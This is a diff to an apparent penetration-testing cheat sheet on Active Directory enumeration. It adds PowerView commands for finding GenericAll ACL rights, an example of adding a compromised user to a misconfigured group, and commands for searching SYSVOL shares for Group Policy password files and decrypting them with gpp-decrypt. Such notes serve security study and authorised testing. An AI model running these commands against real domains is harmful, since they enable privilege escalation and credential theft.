@@ -76,17 +76,54 @@ Warning: PsLoggedon.exe needs the service `Remote Registry` on the target
 ### Service accounts
 
 ```
-cmd > setspn -L iis_service
+cmd > setspn -L some_service
 PS > Get-NetUser -SPN | select samaccountname,serviceprincipalname
 ```
 
 ### Object permissions
 
+```
+Get-ObjectAcl -Identity someuser
+Convert-SidToName S-1-5-21-domainidentifiernumber-relativeidentifier
+Get-ObjectAcl -Identity "Some Departm*" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
+"sid1", "sid2", "sid3" | convert-sidtoname
+```
+Example of misconfiguration:
+```
+net group "Misconfigured Department" alreadyhackeduser /add /domain
+Get-NetGroup "Mis*Dep*" | select member
+net group "Misconfigured Department" hackeduser /del /domain # cleanup and check
+Get-NetGroup "Mis*Dep*" | select member
+```
+Known IDs: https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers
+
 ### Domain shares
+
+Password and hash searches in network shares:
+```
+> Find-DomainShare
+> ls \\pc.domain.com\sysvol\domain.com
+> ls \\pc.domain.com\sysvol\domain.com\Policies
+> cat \\pc.domain.com\sysvol\domain.com\Policies\suspicious-policy-file.xml
+> ls \\otherpc.domain.com\sysvol\domain.com\documentshareoverthenetwork
+> ls \\otherpc.domain.com\sysvol\domain.com\documentshareoverthenetwork\directory-with-secret-files
+```
+Example of password decryption:
+```
+kali$ gpp-decrypt "string-found-in-some-password-file"
+```
+Sysvol: https://social.technet.microsoft.com/wiki/contents/articles/24160.active-directory-back-to-basics-sysvol.aspx
 
 ## Automated AD enumeration
 
 ### SharpHound
 
+```
+
+```
+
 ### BloodHound
 
+```
+
+```
